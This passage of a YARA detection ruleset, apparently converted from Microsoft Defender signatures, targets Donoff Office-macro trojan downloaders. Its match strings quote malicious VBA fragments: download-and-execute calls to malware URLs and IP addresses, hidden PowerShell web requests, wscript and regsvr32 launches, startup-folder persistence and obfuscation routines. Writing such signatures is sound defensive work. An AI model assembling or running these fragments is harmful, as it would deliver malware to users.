        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://140.82.33.69/chim.exe" ascii //weight: 1
        $x_1_2 = "Environ(\"AppData\") & \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
        $x_1_4 = "scheduler.exe" ascii //weight: 1
        $x_1_5 = "ShellExecute" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "enc = StrReverse(enc)" ascii //weight: 1
        $x_1_2 = "J = Mid(enc, i, 1)" ascii //weight: 1
        $x_1_3 = "AppData = AppData & Chr(Asc(J) - 1)" ascii //weight: 1
        $x_1_4 = "Open \"get\", " ascii //weight: 1
        $x_5_5 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 5
        $x_1_6 = "Shell.Application" ascii //weight: 1
        $x_1_7 = "Unable to open document" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Shamakh.HootiyaZ" ascii //weight: 1
        $x_1_2 = "Maviya1 = yazeed1 + yazeed2 + yazeed3 + yazeed4 + \" \" + yazeed5 + yazeed55 + yazeed66" ascii //weight: 1
        $x_1_3 = "carinterface_name (Maviya1)" ascii //weight: 1
        $x_1_4 = "Shell i_name" ascii //weight: 1
        $x_1_5 = {48 6f 6f 74 69 79 61 5a 28 29 [0-3] 44 69 6d 20 79 61 7a 65 65 64 31}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "url = \"http://sqlsrv04/ReportServer?/LN%20Reports/Export%20MAR/Anodenplanung&rs:Format=EXCELOPENXML\"" ascii //weight: 1
        $x_1_2 = "stream.SaveToFile Me.Path & \"\\Anodenplanung.xlsx\", 2" ascii //weight: 1
        $x_1_3 = "Kill Me.Path & \"\\Anodenplanung.xlsx\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_13
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= 7 / 27 / 2021" ascii //weight: 1
        $x_1_2 = "Shell.Application" ascii //weight: 1
        $x_1_3 = "Getting resoucrces to display spreedsheet\", , \"Warning\"" ascii //weight: 1
        $x_1_4 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
        $x_1_5 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_6 = "Environ$(\"USERPROFILE\") & \"\\\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_14
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "s = \"cmd /c cd /d %USERPROFILE% && type \"\"\" + .FullName + \"\"\" | findstr /r \"\"^var\"\" > y.js && wscript y.js \"\"\" + .FullName + " ascii //weight: 1
        $x_1_2 = "n = Shell(s, vbHide)" ascii //weight: 1
        $x_1_3 = ".Content.Font.ColorIndex = wdBlack" ascii //weight: 1
        $x_1_4 = "Document_Open" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_15
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {42 61 53 74 72 20 3d 20 44 65 63 6f 64 65 36 34 28 [0-21] 28 29 29 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 28 22 72 65 67 73 76 72 33 32 20 2f 73 20 22 20 26 20 66 69 6c 65 50 61 74 68 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = "Private Sub Workbook_BeforeClose(Cancel as Boolean)" ascii //weight: 1
        $x_1_4 = "Call ReduceOnline()" ascii //weight: 1
        $x_1_5 = {5c 6e 6f 77 2e 64 6c 6c 22 23 00 70 61 74 68 20 3d 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_16
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://46.30.188.190/webdav/taskhost.exe" ascii //weight: 1
        $x_1_2 = "\"C:\\Users\\\" + username + \"\\Videos\\taskhost.exe\", 2 ' 1 = no overwrite, 2 = overwrite" ascii //weight: 1
        $x_1_3 = "http://46.30.188.190/webdav/status.txt" ascii //weight: 1
        $x_1_4 = "\"C:\\Users\\\" + username + \"\\Videos\\status.bat\", 2 ' 1 = no overwrite, 2 = overwrite" ascii //weight: 1
        $x_1_5 = "x = Shell(Path, vbNormalFocus)" ascii //weight: 1
        $x_1_6 = "DownloadFile" ascii //weight: 1
        $x_1_7 = "DownloadBat" ascii //weight: 1
        $x_1_8 = "Environ(\"username\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_17
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "a = Environ(\"Temp\") & \"\\file.dat\"" ascii //weight: 1
        $x_1_2 = "b = Environ(\"Temp\") & \"\\survey.dat\"" ascii //weight: 1
        $x_1_3 = "d = Environ(\"Temp\") & \"\\survey.dat.log1\"" ascii //weight: 1
        $x_1_4 = "a = Environ(\"Temp\") & \"\\output.dat\"" ascii //weight: 1
        $x_1_5 = "b = Environ(\"Temp\") & \"\\output.dat.log\"" ascii //weight: 1
        $x_1_6 = "d = Environ(\"Temp\") & \"\\survey.dat.log2\"" ascii //weight: 1
        $x_1_7 = "Set s = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_8 = "s.Exec d" ascii //weight: 1
        $x_1_9 = "bin.base64" ascii //weight: 1
        $x_1_10 = "SaveToFile a" ascii //weight: 1
        $x_1_11 = "http://ec2-3-66-213-57.eu-central-1.compute.amazonaws.com/standardchartered" ascii //weight: 1
        $x_1_12 = "ActiveSheet.Range(\"E7\", \"E16\").Locked = True" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (11 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_18
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ojLuwRWdj = Array(\"shlSDnmc\", \"rtkzUZoO\", \"ijVZKiTT\", \"oTAwknlE\", \"lqjqOTVz\")" ascii //weight: 1
        $x_1_2 = "MtriIVTJW = Array(\"fRiBDVJO\", \"RiknnsDI\", \"fOdszAKO\", \"YMRrpLSz\", \"qbEWDDhV\")" ascii //weight: 1
        $x_1_3 = "XczplJZAo = Array(\"WdHqRZiG\", \"TcqDRYFL\", \"kwLnhEbh\", \"HUVDVdOn\", \"RDSiLJYC\")" ascii //weight: 1
        $x_2_4 = "Shell$ EUiouBNnj, 0" ascii //weight: 2
        $x_1_5 = "aPjbqSFDr = Array(\"dANNNGRB\", \"ZiwDblqN\", \"DmOGXAbX\", \"JNRVAqoO\", \"SMrdBaDw\")" ascii //weight: 1
        $x_1_6 = "Bjlabzwit = Array(\"NnjrzTdY\", \"pDApwAjt\", \"ilPtNLci\", \"RFrPBvKO\", \"nbmCIWVs\")" ascii //weight: 1
        $x_1_7 = "OEMWDHEfB = Array(\"jtNikjBL\", \"zZrcNXtt\", \"lCUOjlLP\", \"WfIzFfKA\", \"LNUCwfCv\")" ascii //weight: 1
        $x_1_8 = "JBjTddbZC = dBQBwJdkQJ + uMiKPN + zNkmH + oRHlYcW + fYtFcopO + oKMDk + pmBnYNhC + DYvuQcij + ErRIfPklzI + ZdUkzPSsOT + kcJDdNNuRN + QrdQrlTtFl + mkBvjXCi + YzwWar + mPDjvIbJ + WKlJiNmaJi" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MIY_2147777707_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MIY!MTB"
        threat_id = "2147777707"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "CreateObject(\"wscript.shell\")" ascii //weight: 2
        $x_2_2 = "frm.CommandButton1.Tag & \" c:\\users\\public\\main.hta" ascii //weight: 2
        $x_2_3 = "CreateObject(\"System.Text.StringBuilder\")" ascii //weight: 2
        $x_2_4 = "screenMemoryW.resizeTo(1, 1)" ascii //weight: 2
        $x_2_5 = "screenMemoryW.moveTo(-100, -100)" ascii //weight: 2
        $x_2_6 = "uffer = screenSizeText(tableVariable(requestRequestCounter[0]))" ascii //weight: 2
        $x_2_7 = "selectNamespace.Timeout = 60000" ascii //weight: 2
        $x_2_8 = "MemoryW.close" ascii //weight: 2
        $x_2_9 = "swapVbTable.ToString" ascii //weight: 2
        $x_2_10 = "('msscriptcontrol.scriptcontrol')" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXX_2147778081_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXX!MTB"
        threat_id = "2147778081"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 2
        $x_2_2 = "CreateObject(\"ADODB.Stream\")" ascii //weight: 2
        $x_2_3 = "CreateObject(\"WScript.Shell\")" ascii //weight: 2
        $x_2_4 = "shell_obj.expandEnvironmentStrings(\"%APPDATA%\")" ascii //weight: 2
        $x_2_5 = "URL = \"http://95.181.164.43/jopa.exe\"" ascii //weight: 2
        $x_2_6 = "http_obj.Open \"GET\", URL, False" ascii //weight: 2
        $x_2_7 = "RUNCMD = APPPATH + \"jopa.exe\"" ascii //weight: 2
        $x_2_8 = "shell_obj.Run RUNCMD" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXR_2147778454_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXR!MTB"
        threat_id = "2147778454"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "CreateObject(\"Shell.Application\")" ascii //weight: 2
        $x_2_2 = "ShellExecute \"P\" + " ascii //weight: 2
        $x_2_3 = "MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 2
        $x_2_4 = "p = Len(s) To 1 Step -1" ascii //weight: 2
        $x_2_5 = "Mid(s, p, 1)" ascii //weight: 2
        $x_2_6 = "For i = 1 To VBA.Len" ascii //weight: 2
        $x_2_7 = "wershell" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXL_2147778728_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXL!MTB"
        threat_id = "2147778728"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "ShellExecuteA" ascii //weight: 2
        $x_2_2 = "CreateObject(\"MSXML2.ServerXMLHTTP\")" ascii //weight: 2
        $x_2_3 = "ShellExecute 4242342, \"open\"" ascii //weight: 2
        $x_2_4 = "IsUserAnAdmin Lib \"shell32\"" ascii //weight: 2
        $x_2_5 = "ShellExecute 454345, \"open\"" ascii //weight: 2
        $x_2_6 = "UUID(\"https://usamyforever.azureedge.net/fmnfieikfemsdfdssdf/fjafisisafeg54/excel.txt" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXA_2147778801_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXA!MTB"
        threat_id = "2147778801"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "otecnologiasolar" ascii //weight: 1
        $x_1_2 = "accesslinksgroup" ascii //weight: 1
        $x_1_3 = "ponchokhana.com" ascii //weight: 1
        $x_1_4 = "airdoburaco.com" ascii //weight: 1
        $x_1_5 = "br/ds/0104" ascii //weight: 1
        $x_1_6 = "NEA*" ascii //weight: 1
        $x_1_7 = "com/ds/0104" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXP_2147778867_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXP!MTB"
        threat_id = "2147778867"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "myURL = \"https://long.af/FactDownParty\"" ascii //weight: 1
        $x_1_2 = "CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")" ascii //weight: 1
        $x_1_3 = "CreateObject(\"ADODB.Stream\")" ascii //weight: 1
        $x_1_4 = "SaveToFile Environ(\"USERPROFILE\")" ascii //weight: 1
        $x_1_5 = "Write WinHttpReq.responseBody" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRN_2147779029_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRN!MTB"
        threat_id = "2147779029"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Environ(\"USERPROFILE\") & \"\\Desktop\\\"" ascii //weight: 1
        $x_1_2 = "sPath + \"Wrzod.exe\"" ascii //weight: 1
        $x_1_3 = "DownloadFileB(URL, LocalFilename, \"\", \"\")" ascii //weight: 1
        $x_1_4 = "sPath + Replace(\"Wrzod.!x!\", \"!\", \"e\")" ascii //weight: 1
        $x_1_5 = "CreateObject(\"Wscript.Shell\")" ascii //weight: 1
        $x_1_6 = "objS.Run sFile" ascii //weight: 1
        $x_1_7 = {77 72 7a 6f 64 2e 76 78 6d 2e 70 6c 2f 57 72 7a 6f 64 26 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRN_2147779029_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRN!MTB"
        threat_id = "2147779029"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Salpi5rZ__jmEyZKIjGJ5LE" ascii //weight: 1
        $x_1_2 = "Chr(ds_f - 77)" ascii //weight: 1
        $x_1_3 = "d_fg(164) & d_fg(160) & d_fg(144) & d_fg(191) & d_fg(182) & d_fg(189) & d_fg(161) & d_fg(123) & d_fg(192) & d_fg(149) & d_fg(146) & d_fg(185) & d_fg(153)" ascii //weight: 1
        $x_1_4 = "zWaYuMY_AEVh_cfA1yEiEMIXek_th" ascii //weight: 1
        $x_1_5 = "gfghb bvcvnbc bvcncm" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXD_2147779047_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXD!MTB"
        threat_id = "2147779047"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "X = \"M\"" ascii //weight: 1
        $x_1_2 = "Y = \"s\"" ascii //weight: 1
        $x_1_3 = "Z = \"H\"" ascii //weight: 1
        $x_1_4 = "D = \"T\"" ascii //weight: 1
        $x_1_5 = "E = \"a\"" ascii //weight: 1
        $x_1_6 = "L = \"p\"" ascii //weight: 1
        $x_1_7 = "K = \"j.mp/\"" ascii //weight: 1
        $x_1_8 = "F = \" H\" + D + D + L + \"://\" + K + T" ascii //weight: 1
        $x_1_9 = "pings = X + Y + Z + D + E + F" ascii //weight: 1
        $x_1_10 = "meinkonhun = GetObject(\"\" + \"n\" + \"e\" + \"w\" + \":\" + \"F93\" + \"5\" + \"D\" + \"C\" + \"2\" + \"2\"" ascii //weight: 1
        $x_1_11 = "MsgBox \"Microsoft Office not Installed\"" ascii //weight: 1
        $x_1_12 = "meinkonhun.EXEC pings" ascii //weight: 1
        $x_1_13 = "pings() As String" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXT_2147779258_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXT!MTB"
        threat_id = "2147779258"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"HTTPDownload 'http://1lxtjdias-pod:8080/stage3.exe'" ascii //weight: 1
        $x_1_2 = "CreateObject (\"; Scripting.FileSystemObject; \")" ascii //weight: 1
        $x_1_3 = "Wscript.CreateObject (\"; Wscript.Shell; \")" ascii //weight: 1
        $x_1_4 = "\"WshShell.Run strFile\"" ascii //weight: 1
        $x_1_5 = "FolderExists(Left(path, InStrRev(path" ascii //weight: 1
        $x_1_6 = "Shell \"wscript C:\\DEV\\VBA\\stage2.vbs\"" ascii //weight: 1
        $x_1_7 = "fp = \"C:\\DEV\\VBA\\stage2.vbs\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXN_2147779434_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXN!MTB"
        threat_id = "2147779434"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"Outlook.Application\")" ascii //weight: 1
        $x_1_2 = "CreateObject(\"wscript.\" & she & \"l\")" ascii //weight: 1
        $x_1_3 = "exec(\"powe\" & \"rshell -w Hidden Invoke-WebRequest -Uri " ascii //weight: 1
        $x_1_4 = {43 68 72 28 33 34 29 20 26 20 22 68 74 74 70 3a 2f 2f 31 37 38 2e 31 37 2e 31 37 31 2e 31 34 34 2f 73 63 68 2f [0-15] 2e 65 78 22}  //weight: 1, accuracy: Low
        $x_1_5 = "\" -OutF\" & \"ile \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RX_2147779622_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RX!MTB"
        threat_id = "2147779622"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ft5 = j5 + j99 + r4 + r33 + rm7 + w7 + r90 + rm7 + x4 + y88 + q1 + x4 + r89 + x4 + r4" ascii //weight: 1
        $x_1_2 = {53 65 74 20 57 73 68 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 0d 0a 57 73 68 53 68 65 6c 6c 2e 52 75 6e 20 28 [0-5] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RE_2147779623_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RE!MTB"
        threat_id = "2147779623"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {31 37 38 2e 31 37 2e 31 37 31 2e 31 34 34 2f 2f 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {31 38 35 2e 31 31 37 2e 39 31 2e 31 39 39 2f 2f 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "C:\\Users\\Public\\Documents\\cupaudience.ex" ascii //weight: 1
        $x_1_4 = {63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f [0-31] 2f [0-31] 2f 73 68 61 78 5f 73 65 72 76 65 72 2e 65 78 65 5f 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_5 = {32 30 39 2e 31 34 31 2e 36 31 2e 31 32 34 2f 2f 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_6 = "C:\\Users\\Public\\Documents\\thisdaughter.ex\" & Chr(101)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRE_2147779671_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRE!MTB"
        threat_id = "2147779671"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(ds_f - 77)" ascii //weight: 1
        $x_1_2 = "d_fg(164) & d_fg(160) & d_fg(144) & d_fg(191) & d_fg(182) & d_fg(189) & d_fg(161) & d_fg(123) & d_fg(192) & d_fg(149) & d_fg(146) & d_fg(185) & d_fg(153)" ascii //weight: 1
        $x_1_3 = "gfghb bvcvnbc bvcncm" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXSS_2147779807_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXSS!MTB"
        threat_id = "2147779807"
        type = "TrojanDownloader"
